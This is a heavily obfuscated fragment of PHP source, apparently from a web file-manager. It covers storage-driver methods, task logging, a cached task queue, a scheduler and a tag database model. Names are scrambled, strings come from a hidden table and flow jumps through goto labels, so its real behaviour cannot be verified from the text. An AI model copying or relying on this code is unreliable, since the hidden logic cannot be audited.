$àë¼Şí - $ÃœÀğšÖ); $ŸÊ’¯² .= fread($­ŞÀ˜Å†, $ÃœÀğšÖ); fclose($­ŞÀ˜Å†); return md5($ŸÊ’¯²) . $àë¼Şí; } public function getContent($ÈÈÎÑ©œ) { $ÈÈÎÑ©œ = $this->iconvSystem($ÈÈÎÑ©œ); return file_get_contents($ÈÈÎÑ©œ); } public function setContent($øÆ¾Àª…, $üá‰˜ä² = '') { $øÆ¾Àª… = $this->iconvSystem($øÆ¾Àª…); $à¸œ…µ… = @file_put_contents($øÆ¾Àª…, $üá‰˜ä², LOCK_EX); clearstatcache(); @chmod($øÆ¾Àª…, $this->pathAuth); return $à¸œ…µ… === !1 ? !1 : !0; } public function fileSubstr($¥Ú³£¼ü, $ÃÓó·‘ğ = 0, $¡Ì·¼Ó— = false) { $ê˜™—Øú =& $_SERVER[”ú…±Ú¥]; $¥Ú³£¼ü = $this->iconvSystem($¥Ú³£¼ü); if ($¡Ì·¼Ó— === !1) { $¡Ì·¼Ó— = $this->size($¥Ú³£¼ü); } if ($¡Ì·¼Ó— <= 0) { return $ê˜™—Øú[12]; } $µË÷éÇ = fopen($¥Ú³£¼ü, $ê˜™—Øú[1396]); if (!$µË÷éÇ) { return !1; } fseek_64($µË÷éÇ, $ÃÓó·‘ğ); $«¦öœÎ’ = fread($µË÷éÇ, $¡Ì·¼Ó—); fclose($µË÷éÇ); return $«¦öœÎ’; } public function upload($„‚Ğ‘µ, $â¤ü¯, $°â¡²¾§ = false, $Ù¤§© = REPEAT_REPLACE) { if ($°â¡²¾§) { return $this->moveFile($â¤ü¯, $„‚Ğ‘µ); } return $this->copyFile($â¤ü¯, $„‚Ğ‘µ); } public function setModifyTime($İÃİ‘¹, $Ğİœ‚Ô» = '') { @touch($İÃİ‘¹, intval($Ğİœ‚Ô»)); } public function download($É¢‰ÍìÚ, $¿øœ œ±) { return $this->iconvSystem($É¢‰ÍìÚ); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($…å•š) { parent::__construct($…å•š); $this->signatureVersion($_SERVER[”ú…±Ú¥][226]); } public function fileOutLink($¢‰İÂğ¢) { $´†È‘âÕ =& $_SERVER[”ú…±Ú¥]; if (substr($¢‰İÂğ¢, 0, 7) == $´†È‘âÕ[1360]) { $¢‰İÂğ¢ = $´†È‘âÕ[1361] . substr($¢‰İÂğ¢, 7); } header($´†È‘âÕ[161] . $¢‰İÂğ¢); die; } } goto eòµ’Õ÷Ô ; F‚¬¾¨ìÓµ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($²¦—‘÷…, $‹à„Î¬å = '', $‰§Á”¢ = 0, $±ì±‚ùÇ = '') { $äû¼õ® =& $_SERVER[”ú…±Ú¥]; $ĞÀîåĞí = new Task($²¦—‘÷…, $‹à„Î¬å, $‰§Á”¢, $±ì±‚ùÇ); $GLOBALS[$äû¼õ®[1754] . $²¦—‘÷…] = new TaskLog($äû¼õ®[1655], $ĞÀîåĞí, $±ì±‚ùÇ); return $ĞÀîåĞí; } public function __construct($ ²ãÛ”ç = '', $šü°ˆ¬ = '', $‘™Ñæ†ì = '') { $ôÔÔ¨ˆ“ =& $_SERVER[”ú…±Ú¥]; if (!$ ²ãÛ”ç) { $ ²ãÛ”ç = $ôÔÔ¨ˆ“[1655]; } $ÍˆÒĞ²µ = $ ²ãÛ”ç . $ôÔÔ¨ˆ“[424] . rand_string(10); if (!$‘™Ñæ†ì) { $‘™Ñæ†ì = $ ²ãÛ”ç . $ôÔÔ¨ˆ“[53] . $‘™Ñæ†ì; } switch ($ ²ãÛ”ç) { case $ôÔÔ¨ˆ“[1655]: if (!$šü°ˆ¬ || !$šü°ˆ¬->task) { return echoLog($ ²ãÛ”ç . $ôÔÔ¨ˆ“[1755]); } $Ö¤é‡Œ² = $šü°ˆ¬; $ÍˆÒĞ²µ = $Ö¤é‡Œ²->task[$ôÔÔ¨ˆ“[437]]; $ ²ãÛ”ç = $Ö¤é‡Œ²->task[$ôÔÔ¨ˆ“[437]]; if (!$Ö¤é‡Œ²->task[$ôÔÔ¨ˆ“[1571]]) { $Ö¤é‡Œ²->task[$ôÔÔ¨ˆ“[1571]] = $‘™Ñæ†ì ? $‘™Ñæ†ì : $ ²ãÛ”ç; } break; case $ôÔÔ¨ˆ“[1756]: if (!$šü°ˆ¬) { return echoLog($ ²ãÛ”ç . $ôÔÔ¨ˆ“[1757]); } $Ø»ÊÁâ = is_string($šü°ˆ¬) ? array($šü°ˆ¬) : $šü°ˆ¬; $Ö¤é‡Œ² = new TaskFileTransfer($ÍˆÒĞ²µ, $ ²ãÛ”ç, 0, $‘™Ñæ†ì ? $‘™Ñæ†ì : $Ø»ÊÁâ[0]); foreach ($Ø»ÊÁâ as $È§ù¤¿) { $Ö¤é‡Œ²->addPath($È§ù¤¿); } break; case $ôÔÔ¨ˆ“[351]: if (!$šü°ˆ¬) { return echoLog($ ²ãÛ”ç . $ôÔÔ¨ˆ“[1757]); } $Ø»ÊÁâ = is_string($šü°ˆ¬) ? array($šü°ˆ¬) : $šü°ˆ¬; $Ö¤é‡Œ² = new TaskZip($ÍˆÒĞ²µ, $ ²ãÛ”ç, 0, $‘™Ñæ†ì ? $‘™Ñæ†ì : $Ø»ÊÁâ[0]); foreach ($Ø»ÊÁâ as $È§ù¤¿) { $Ö¤é‡Œ²->addPath($È§ù¤¿); } break; case $ôÔÔ¨ˆ“[1243]: if (!$šü°ˆ¬) { return echoLog($ ²ãÛ”ç . $ôÔÔ¨ˆ“[1757]); } $Ö¤é‡Œ² = new TaskUnZip($ÍˆÒĞ²µ, $ ²ãÛ”ç, 0, $‘™Ñæ†ì ? $‘™Ñæ†ì : $šü°ˆ¬); if ($šü°ˆ¬) { $Ö¤é‡Œ²->addFile($šü°ˆ¬); } break; case $ôÔÔ¨ˆ“[148]: $Ö¤é‡Œ² = new TaskHttp($ÍˆÒĞ²µ, $ ²ãÛ”ç); break; default: return; break; } $this->task = $Ö¤é‡Œ²; $this->taskID = $ÍˆÒĞ²µ; Hook::bind($ôÔÔ¨ˆ“[1692], array($this, $ôÔÔ¨ˆ“[1758])); Hook::bind($ôÔÔ¨ˆ“[1694], array($this, $ôÔÔ¨ˆ“[1759])); Hook::bind($ôÔÔ¨ˆ“[1688], array($this, $ôÔÔ¨ˆ“[1760])); echoLog($ôÔÔ¨ˆ“[1761] . $Ö¤é‡Œ²->task[$ôÔÔ¨ˆ“[1571]]); } public function __destruct() { $this->end(); } public function end($Ö¦ãÃº = '') { $³ÂØ™»µ =& $_SERVER[”ú…±Ú¥]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Ö¦ãÃº); $this->task = !1; $this->taskID = !1; Hook::unbind($³ÂØ™»µ[1692], array($this, $³ÂØ™»µ[1758])); Hook::unbind($³ÂØ™»µ[1694], array($this, $³ÂØ™»µ[1759])); Hook::unbind($³ÂØ™»µ[1688], array($this, $³ÂØ™»µ[1760])); } public function taskUpdate($¼âÁ’ï) { $éÌ¶¾·ú =& $_SERVER[”ú…±Ú¥]; if (!$¼âÁ’ï || $this->taskID != $¼âÁ’ï[$éÌ¶¾·ú[437]]) { return; } $®Ş˜ğ¡” = 20; $¿ÊÀš¢ß = intval($¼âÁ’ï[$éÌ¶¾·ú[1673]] * $®Ş˜ğ¡”); $Û«Ãù¨µ = $éÌ¶¾·ú[162] . str_repeat($éÌ¶¾·ú[913], $¿ÊÀš¢ß) . $éÌ¶¾·ú[1043] . str_repeat($éÌ¶¾·ú[53], $®Ş˜ğ¡” - $¿ÊÀš¢ß) . $éÌ¶¾·ú[164]; $ï¨…ï = $Û«Ãù¨µ . sprintf($éÌ¶¾·ú[1762], $¼âÁ’ï[$éÌ¶¾·ú[1673]] * 100) . $éÌ¶¾·ú[1763]; $›×ö¿æÜ = $ï¨…ï . $¼âÁ’ï[$éÌ¶¾·ú[1672]] . $éÌ¶¾·ú[8] . $¼âÁ’ï[$éÌ¶¾·ú[818]] . LNG($éÌ¶¾·ú[1764]); $»ñÙÆ‘¢ = $éÌ¶¾·ú[12]; if ($¼âÁ’ï[$éÌ¶¾·ú[1748]]) { $›×ö¿æÜ = $ï¨…ï . size_format($¼âÁ’ï[$éÌ¶¾·ú[1672]]) . $éÌ¶¾·ú[8] . size_format($¼âÁ’ï[$éÌ¶¾·ú[818]]); $»ñÙÆ‘¢ = size_format($¼âÁ’ï[$éÌ¶¾·ú[1674]]) . $éÌ¶¾·ú[1765]; } if ($¼âÁ’ï[$éÌ¶¾·ú[1093]]) { $¼âÁ’ï[$éÌ¶¾·ú[1722]] = $¼âÁ’ï[$éÌ¶¾·ú[1093]] . $éÌ¶¾·ú[53] . $¼âÁ’ï[$éÌ¶¾·ú[1722]]; } if ($¼âÁ’ï[$éÌ¶¾·ú[1722]]) { $¿Ïç´‘ü = $éÌ¶¾·ú[12]; if ($¼âÁ’ï[$éÌ¶¾·ú[1724]]) { $¿Ïç´‘ü = $éÌ¶¾·ú[50] . size_format($¼âÁ’ï[$éÌ¶¾·ú[1725]]) . $éÌ¶¾·ú[8] . size_format($¼âÁ’ï[$éÌ¶¾·ú[1724]]); } $»ñÙÆ‘¢ .= $¼âÁ’ï[$éÌ¶¾·ú[1722]] . $¿Ïç´‘ü; } if ($¼âÁ’ï[$éÌ¶¾·ú[795]] && !$¼âÁ’ï[$éÌ¶¾·ú[1724]]) { $»ñÙÆ‘¢ .= $éÌ¶¾·ú[53] . size_format($¼âÁ’ï[$éÌ¶¾·ú[1729]]) . $éÌ¶¾·ú[8] . size_format($¼âÁ’ï[$éÌ¶¾·ú[795]]); } echoLog($›×ö¿æÜ . $éÌ¶¾·ú[53] . $»ñÙÆ‘¢, !0); } public function taskEnd($°ÌÕ¯èå) { $½™ô°¿ç =& $_SERVER[”ú…±Ú¥]; if (!$°ÌÕ¯èå || $this->taskID != $°ÌÕ¯èå[$½™ô°¿ç[437]]) { return; } $óù•éĞ‘ = $°ÌÕ¯èå ? $°ÌÕ¯èå[$½™ô°¿ç[1672]] . $½™ô°¿ç[8] . $°ÌÕ¯èå[$½™ô°¿ç[818]] . LNG($½™ô°¿ç[1764]) . $½™ô°¿ç[71] : $½™ô°¿ç[12]; echoLog($½™ô°¿ç[1766] . $°ÌÕ¯èå[$½™ô°¿ç[1571]] . ($°ÌÕ¯èå[$½™ô°¿ç[491]] ? $½™ô°¿ç[71] . $°ÌÕ¯èå[$½™ô°¿ç[491]] : $½™ô°¿ç[12]) . $½™ô°¿ç[71] . $óù•éĞ‘ . $½™ô°¿ç[1767] . sprintf($½™ô°¿ç[882], timeFloat() - $°ÌÕ¯èå[$½™ô°¿ç[1675]]) . $½™ô°¿ç[1687]); $this->end(); } public function taskKill($å–¨Ğç™) { $óéÌˆÖã =& $_SERVER[”ú…±Ú¥]; if (!$å–¨Ğç™ || $this->taskID != $å–¨Ğç™[$óéÌˆÖã[437]]) { return; } echoLog($óéÌˆÖã[1768] . $å–¨Ğç™[$óéÌˆÖã[1571]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\165\x65\165\x65\x4c\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\121\x75\x65\x75\145\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($è—²‰œÈ, $½Õ¼”ûû = array(), $„¿÷Şº = '', $²Ì— = '') { $şğ®¯Õ =& $_SERVER[”ú…±Ú¥]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($²Ì— && array_find_by_field(self::$listData, $şğ®¯Õ[94], $²Ì—)) { return !0; } self::$listData[] = array($şğ®¯Õ[302] => $è—²‰œÈ, $şğ®¯Õ[1769] => $½Õ¼”ûû, $şğ®¯Õ[491] => $„¿÷Şº, $şğ®¯Õ[94] => $²Ì—); return !0; } public static function addSubmit() { $»Ï—‹Ì =& $_SERVER[”ú…±Ú¥]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($»Ï—‹Ì[1770] . json_encode_force(array_to_keyvalue(self::$listData, $»Ï—‹Ì[12], $»Ï—‹Ì[491])), $»Ï—‹Ì[1771]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($øÒÈ¼Íƒ, $‰©ÇÒ = array(), $‰ì´ºŞ˜ = '', $æÌÏì¦” = '') { $¥’Š‚ü¦ =& $_SERVER[”ú…±Ú¥]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ı©ÑØÕ¯ = self::getAll(); if ($æÌÏì¦” && array_find_by_field($ı©ÑØÕ¯, $¥’Š‚ü¦[94], $æÌÏì¦”)) { return !0; } $ı©ÑØÕ¯[] = array($¥’Š‚ü¦[302] => $øÒÈ¼Íƒ, $¥’Š‚ü¦[1769] => $‰©ÇÒ, $¥’Š‚ü¦[491] => $‰ì´ºŞ˜, $¥’Š‚ü¦[94] => $æÌÏì¦”); write_log($¥’Š‚ü¦[1770] . $‰ì´ºŞ˜, $¥’Š‚ü¦[1771]); self::setAll($ı©ÑØÕ¯); return !0; } public static function run() { $‰¸ğ”Ö =& $_SERVER[”ú…±Ú¥]; $ÙäªàØÃ = self::getAll(); $è¸ŞŸ±Û = array_shift($ÙäªàØÃ); if (!$è¸ŞŸ±Û) { return !1; } self::setAll($ÙäªàØÃ); $Øæ‚Ù‘æ = timeFloat(); $ŸîË÷ƒ¹ = $‰¸ğ”Ö[12]; try { $ŸîË÷ƒ¹ = Hook::apply($è¸ŞŸ±Û[$‰¸ğ”Ö[302]], $è¸ŞŸ±Û[$‰¸ğ”Ö[1769]]); } catch (Exception $ÛÑ…›Ÿ¼) { } $ÎçÀÔ¦ı = number_format(timeFloat() - $Øæ‚Ù‘æ, 3) . $‰¸ğ”Ö[1687]; if ($ŸîË÷ƒ¹ && is_string($ŸîË÷ƒ¹)) { $ÎçÀÔ¦ı = $ÎçÀÔ¦ı . $‰¸ğ”Ö[1772] . $ŸîË÷ƒ¹; } write_log($‰¸ğ”Ö[1773] . $è¸ŞŸ±Û[$‰¸ğ”Ö[491]] . $‰¸ğ”Ö[1774] . $ÎçÀÔ¦ı, $‰¸ğ”Ö[1771]); return !0; } public static function count() { $ñ¬´Ç = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ñ¬´Ç) { return 0; } return intval($ñ¬´Ç); } public static function getAll() { $‰ÆŞéƒƒ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$‰ÆŞéƒƒ) { return array(); } return $‰ÆŞéƒƒ; } public static function setAll($ôÑòÛÖ) { $°ÆúÅÄá = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ôÑòÛÖ), $°ÆúÅÄá); Cache::set(self::QUEUE_DATA, $ôÑòÛÖ, $°ÆúÅÄá); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($–œÎ–’ü, $ó©ı§ÌÙ = 5.0) { if (!$–œÎ–’ü) { return; } $ÃÙŠ”¦è = Cache::get($–œÎ–’ü); if (!$ÃÙŠ”¦è || timeFloat() - floatVal($ÃÙŠ”¦è) >= $ó©ı§ÌÙ) { Cache::set($–œÎ–’ü, timeFloat(), $ó©ı§ÌÙ * 10); return !0; } return !1; } public static function timeLimitCall($š‚€Øõ…, $ÚõØ†‘—, $Óé¬‚ğÂ, $ì¸Õ¹Àå = 5.0) { $ççè¬° =& $_SERVER[”ú…±Ú¥]; if (!$š‚€Øõ… || !$ÚõØ†‘—) { return; } self::$asyncAdd = !0; $¬£òÒ¯ = $ççè¬°[1775]; $®¬˜Ğá = Cache::get($¬£òÒ¯, !0); $ãçµ‚Şó = array($ççè¬°[1776] => timeFloat(), $ççè¬°[1777] => timeFloat(), $ççè¬°[302] => $ÚõØ†‘—, $ççè¬°[1769] => $Óé¬‚ğÂ, $ççè¬°[180] => $ì¸Õ¹Àå); if (is_array($®¬˜Ğá[$š‚€Øõ…])) { $ãçµ‚Şó[$ççè¬°[1777]] = $®¬˜Ğá[$š‚€Øõ…][$ççè¬°[1777]]; } if (is_array($®¬˜Ğá[$š‚€Øõ…])) { if (timeFloat() - $®¬˜Ğá[$š‚€Øõ…][$ççè¬°[1776]] < $ãçµ‚Şó[$ççè¬°[180]] * 0.3) { return; } $ãçµ‚Şó[$ççè¬°[1777]] = $®¬˜Ğá[$š‚€Øõ…][$ççè¬°[1777]]; } $®¬˜Ğá[$š‚€Øõ…] = $ãçµ‚Şó; Cache::set($¬£òÒ¯, $®¬˜Ğá, 60); Cache::removeMemory($¬£òÒ¯); write_log($ççè¬°[1778] . $š‚€Øõ… . $ççè¬°[71] . $ÚõØ†‘—, $ççè¬°[1771]); } public static function timeLimitCallLoop() { $é§á±“ =& $_SERVER[”ú…±Ú¥]; $™ÏóÓ­ = array($é§á±“[1779]); $Ö…¨¶Ä¹ = in_array(strtolower(ACTION), $™ÏóÓ­); if (!$Ö…¨¶Ä¹ && !self::$asyncAdd) { return; } $àâòÁ‡ì = $é§á±“[1775]; $¦÷çß€• = Cache::get($àâòÁ‡ì, !0); if (!$¦÷çß€• || count($¦÷çß€•) <= 0) { return; } $ÕÎ•ÀñŒ = !1; $Ğ¹Öè°€ = timeFloat(); $¢œÃéğ = array(); foreach ($¦÷çß€• as $¥û¢ª€š => $à‹Š©ª¿) { if ($Ğ¹Öè°€ - $à‹Š©ª¿[$é§á±“[1777]] > $à‹Š©ª¿[$é§á±“[180]]) { $ÕÎ•ÀñŒ = !0; try { Hook::apply($à‹Š©ª¿[$é§á±“[302]], $à‹Š©ª¿[$é§á±“[1769]]); write_log($é§á±“[1780] . $¥û¢ª€š . $é§á±“[71] . $à‹Š©ª¿[$é§á±“[302]] . $é§á±“[1781] . ACTION, $é§á±“[1771]); } catch (Exception $ô¸–âã) { } continue; } $¢œÃéğ[$¥û¢ª€š] = $à‹Š©ª¿; } if (!$ÕÎ•ÀñŒ) { return; } if (!$¢œÃéğ) { return Cache::remove($àâòÁ‡ì); } Cache::set($àâòÁ‡ì, $¢œÃéğ, 60); Cache::removeMemory($àâòÁ‡ì); } public static function finished($£í¬‚å, $²÷æÛÛÖ) { $İ¯Úôğ =& $_SERVER[”ú…±Ú¥]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($İ¯Úôğ[302] => $£í¬‚å, $İ¯Úôğ[1769] => $²÷æÛÛÖ); } private static function finishedRun() { $–ÃïĞœË =& $_SERVER[”ú…±Ú¥]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $²½©³Ü¸) { try { Hook::apply($²½©³Ü¸[$–ÃïĞœË[302]], $²½©³Ü¸[$–ÃïĞœË[1769]]); } catch (Exception $ÈÏÀÜà–) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto BæÓàÜ¥‘æ; Eé³œœ©ƒÙ: function binCheckBigger($ìÄ‘®€¶, $†½èœ) { return $ìÄ‘®€¶ > $†½èœ; } $_SERVER[$_SERVER[ùÎ²ˆ•Ñ][3]] = ("\70\62\61\62".base64_decode('ODM='))+0;$_gjhc="a7i98squvjbw6dmx2zgkh4cpn1o5y3fel0trix9secy4hurn2o8bj3gm0f5ktw6d1vpqa";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ù“Ä€òÇ, $±ª¡Ãè) { $›¬ïĞ–ß =& $_SERVER[”ú…±Ú¥]; if (isset(self::$_methodList[$Ù“Ä€òÇ])) { return @call_user_func_array(self::$_methodList[$Ù“Ä€òÇ], $±ª¡Ãè); } else { if (method_exists($this, $Ù“Ä€òÇ)) { return call_user_func_array(array($this, $Ù“Ä€òÇ), $±ª¡Ãè); } else { think_exception(__CLASS__ . $›¬ïĞ–ß[4] . $Ù“Ä€òÇ . $›¬ïĞ–ß[5]); } } } public static function __callStatic($§‹óùº, $Ø×÷±âÖ) { if (isset(self::$_methodListStatic[$§‹óùº])) { return call_user_func_array(self::$_methodListStatic[$§‹óùº], $Ø×÷±âÖ); } else { if (method_exists(self, $§‹óùº)) { return call_user_func_array(array(self, $§‹óùº), $Ø×÷±âÖ); } else { show_json("{$§‹óùº}\x28\x29\40\x6e\157\x74\x20\145\170\x69\x73\164\x3b", !1); } } } public static function addMethod($–É—¾†ª, $©ÀÒœ™—) { self::$_methodList[$–É—¾†ª] = $©ÀÒœ™—; } public static function addMethodStatic($øÂÔŒ†², $î»ØÚØ) { self::$_methodListStatic[$øÂÔŒ†²] = $î»ØÚØ; } } goto dÚ…­ß¿¡; A²‘¬’ÊÜ„: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($Ë„”ÇÇ§) { $Ìæ£›Û¼ =& $_SERVER[”ú…±Ú¥]; return array($Ìæ£›Û¼[1972] => array($Ìæ£›Û¼[2356] . USER_ID, $Ìæ£›Û¼[1973])); } protected function listData() { $¤Ì†Ñø =& $_SERVER[”ú…±Ú¥]; $ÌøéÈŠå = array($¤Ì†Ñø[1662] => USER_ID, $¤Ì†Ñø[521] => array($¤Ì†Ñø[1976], 0)); $öÅ²³ˆ = $¤Ì†Ñø[2357]; $öÇãôÁ” = $this->field($öÅ²³ˆ)->where($ÌøéÈŠå)->order($¤Ì†Ñø[1979])->select(); return $öÇãôÁ” ? $öÇãôÁ” : array(); } protected function addToTag($¸”áè½, $¢¢‡¾Ïä) { $‡µ×½Ñ =& $_SERVER[”ú…±Ú¥]; if (!Model($‡µ×½Ñ[2121])->listData($¢¢‡¾Ïä)) { return !1; } if (is_numeric($¸”áè½)) { $¢›Áø¨ = Model($‡µ×½Ñ[857])->pathInfo($¸”áè½); if (!$¢›Áø¨) { return !1; } } else { $¢›Áø¨ = IO::infoSimple($¸”áè½); if (!$¢›Áø¨) { return !1; } $ÎºÊğ‹ = $¢›Áø¨[$‡µ×½Ñ[32]]; $åĞõ = $¢›Áø¨[$‡µ×½Ñ[33]]; if (isset($¢›Áø¨[$‡µ×½Ñ[448]])) { $åĞõ = $¢›Áø¨[$‡µ×½Ñ[448]] == $‡µ×½Ñ[88] ? $‡µ×½Ñ[75] : $‡µ×½Ñ[210]; } } $‡Âé‘´ = array($‡µ×½Ñ[1662] => USER_ID, $‡µ×½Ñ[521] => $¢¢‡¾Ïä, $‡µ×½Ñ[459] => $¸”áè½, $‡µ×½Ñ[460] => $åĞõ ? $åĞõ : $‡µ×½Ñ[454], $‡µ×½Ñ[458] => $ÎºÊğ‹ ? $ÎºÊğ‹ : $‡µ×½Ñ[12], $‡µ×½Ñ[1865] => 0); if ($this->where($‡Âé‘´)->find()) { return !1; } return $this->add($‡Âé‘´); } protected function removeFromTag($ê¿½±„Ø, $º™ë‰) { $ù¿Ñ®ö¯ =& $_SERVER[”ú…±Ú¥]; if (!Model($ù¿Ñ®ö¯[2121])->listData($º™ë‰)) { return !1; } if (is_array($ê¿½±„Ø)) { $ê¿½±„Ø = array($ù¿Ñ®ö¯[7], $ê¿½±„Ø); } $è”‡éÉ = array($ù¿Ñ®ö¯[1662] => USER_ID, $ù¿Ñ®ö¯[521] => $º™ë‰, $ù¿Ñ®ö¯[459] => $ê¿½±„Ø); return $this->where($è”‡éÉ)->delete(); } protected function removeByTag($¢Ê»ŠÉå) { $ı¯ü„¶ó =& $_SERVER[”ú…±Ú¥]; if (!$¢Ê»ŠÉå) { return !1; } $êè¯œ»· = array($ı¯ü„¶ó[1662] => USER_ID, $ı¯ü„¶ó[521] => $¢Ê»ŠÉå); return $this->where($êè¯œ»·)->delete(); } protected function removeBySource($ıÌµà) { $İ˜ÅİÔÄ =& $_SERVER[”ú…±Ú¥]; if (is_array($ıÌµà)) { $ıÌµà = array($İ˜ÅİÔÄ[7], $ıÌµà); } $Ğâ’ ¾ã = array($İ˜ÅİÔÄ[1662] => USER_ID, $İ˜ÅİÔÄ[521] => array($İ˜ÅİÔÄ[1043], 0), $İ˜ÅİÔÄ[459] => $ıÌµà); return $this->where($Ğâ’ ¾ã)->delete(); } }